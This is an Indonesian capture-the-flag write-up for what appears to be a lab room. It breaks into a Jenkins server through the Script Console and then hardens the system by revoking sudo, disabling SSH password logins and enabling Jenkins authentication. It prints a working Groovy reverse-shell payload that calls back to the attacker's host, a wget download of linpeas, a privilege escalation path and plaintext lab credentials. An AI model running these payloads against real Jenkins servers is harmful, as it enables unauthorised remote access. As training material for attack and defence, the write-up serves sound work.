# Persiapan
pertama kita scan dengan `rustscan`
```
rustscan -a 10.10.234.56 -- -A -sC | tee zcan-fast
...
Open 10.10.234.56:22                                                                                                                 
Open 10.10.234.56:8080
...
```
selanjutnya kita bisa masuk sebagai admin dengan creds `admin:SuperStrongPassword123` menggunakan ssh
```
ssh admin@IP-target
```

# Red Team
Setelah itu buka IP-target dengan port 8080 `http://IP-target:8080`, dan kita mendapatkan service Jenkins. Selanjutnya kita dapat mendapatkan shell dengan revshell, dengan memanfaatkan `Manage Jenkins -> Script Console` (ada dibawah, scorll). Selanjutnya inputkan salah satu revshell code berikut
```
# Windows
String host="IP-local";
int port=6666;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


#Linux
String host="IP-local";
int port=6666;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Selanjutnya persiapkan listener `rlwrap ncat -lvnp PORT`, dan run code revshell yang ada di browser tadi. Nantinya kita akan mendapat shell session. Selanjutnya kita stabilize shell dengan cara
1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. (CTRL+Z) lalu `stty -a`
3. `stty raw -echo; fg`
4. `stty rows <int>` -> masukkan angka hasil `stty -a` bagian rows
5. `stty cols <int>` -> masukkan angka hasil `stty -a` bagian columns

Jika sudah mendapat revshell yang stabil, selanjutnya kita dapat upload linpeas ke target.
1. `python3 -m http.server 5120` (diasumsikan **linpeas.sh** ada di cwd local)
2. `wget http://IP-local:5120/linpeas.sh` (lakukan di revshell target)
3. `chmod +x linpeas.sh` (lakukan di revshell target)
4. `./linpeas.sh`

hasilnya adalah kita menemukan file di `/opt/scripts/backup.sh` yang memiliki isi menarik
```
...
...
username="tracy"
password="13_1n_33"
Ip="localhost"
sshpass -p "$password" scp /var/lib/jenkins/backup.tar.gz $username@$Ip:/home/tracy/backups
/bin/sleep 10
```

kita menemukan creds user **tracy** yaitu `tracy:13_1n_33`, dan creds tersebut digunakan untuk melakukan backup dengan program `sshpass`. Kita dapat ssh ke user **tracy** dengan creds tersebut, `ssh tracy@IP-target`. Setelah ke user **tracy**, kita dapat coba `sudo -l`, dan hasilnya, ternyata user **tracy** termasuk kedalam sudoers grup yang mana berarti kita dapat menjalankan semua aplikasi. Kita bisa langsung `sudo su` dan memasukkan password dari user **tracy** untuk menjadi root. Selanjutnya kita dapat mengambil root flag di `/root/flag.txt`.

# Blue Team
Dari sisi red team sudah dilakukan, saatnya kita melakukan hardening system sebagai blue team. Untuk langkah awal, kita dapat memulainya dengan menghapus user **tracy** dari sudoers grup menggunakan akun admin yang kita miliki dengan cara
```
sudo deluser tracy sudo
```
jika sudah, maka ketika dicek dengan user **tracy** kita dapat melihat bahwa kita tidak akan bisa melakukan `sudo -l -U tracy` lagi dengan indikasi munculnya error **"User tracy is not allowed to run sudo on jenkins."**. Namun itu tidak akan berefek ke session yang dibuat saat ini, kita dapat cek dengan re-login ssh di user **tracy** atau berganti user sebagai **tracy** di revshell session dengan `su tracy`, dan command `sudo -l`, nantinya akan muncul error **"Sorry, user tracy may not run sudo on jenkins."**.

Perubahan satu ini saja sudah bisa memberikan perbedaan dalam mendapatkan root akses dan menjadi user **tracy**. Sekarang attacker akan tersisa 3 pilihan:
- enumerate server lebih jauh untuk semua rute yang possible.
- cari cara untuk melakukan perpindahan secara lateral dalam sistem ke user dengan akses root possible.
- cari target yang berbeda. 

Setelah semua itu, kita dapat melakukan hardening lagi, dan kali ini karena masih terdapat celah untuk bisa login ssh, kita dapat menonaktifkan login SSH berbasis password sehingga kita dapat menggagalkan kemungkinan login SSH melalui plaintext creds. Kita dapat masuk sebagai berubah menjadi **root** dengan cara `sudo su` untuk menjadi root shell. Selanjutnya pada admin shell (yang sudah menjadi root), kita edit file `/etc/ssh/sshd_config` dengan vim/nano. Dan ubah beberapa hal berikut
Sebelum
```
...
# default value.

Include /etc/ssh/sshd_config.d/*.conf
...
# To disable tunneled clear text passwords, change to no here!
# PasswordAuthentication yes
<flag>
...
```

Sesudah
```
...
# default value.

#Include /etc/ssh/sshd_config.d/*.conf
...
# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
<flag>
...
```
selain itu, kita juga akan dapat flag di ssh config file ini.

Lalu restart service `ssh` dengan cara `systemctl restart ssh` (jika sudah jadi root shell). Jika kita connect `ssh` ke user **tracy**, maka akan error `tracy@10.10.223.161: Permission denied (publickey).`. Untuk hardening lagi, kita dapat ganti password dari tiap user (**admin** dan **tracy**) dengan cara `passwd <username>` (harus dalam kondisi root shell) lalu memasukkan password yang baru.

Selanjutnya promoting zero-trust. Jadi jika kita buka `http://IP-target:8080/` maka kita akan bisa langsung punya akses ke Jenkins, hal ini tentunya tidak aman sama sekali. Jadi kita dapat mengubah config file untuk Jenkins ini. Terdapat 2 file config di `/var/lib/jenkins` yaitu `config.xml` dan `config.xml.bak`. Jika kita compare keduanya, terdapat hal yang berbeda di `config.xml.bak` yang memiliki
```
<!--authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
  </authorizationStrategy-->
  <flag>
  <!--securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm-->
```
yang mana script tersebut memiliki fungsi untuk memunculkan login form untuk service Jenkins. Kita edit menjadi
```
<authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    <denyAnonymousReadAccess>true</denyAnonymousReadAccess>
  </authorizationStrategy-->
  <flag>
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    <disableSignup>true</disableSignup>
    <enableCaptcha>false</enableCaptcha>
  </securityRealm>
```
Selanjutnya kita hapus file `config.xml` dengan `rm`, lalu copy atau ubah nama file `config.xml.bak` ke `config.xml`, dan tidak lupa untuk restart service `systemctl restart jenkins`.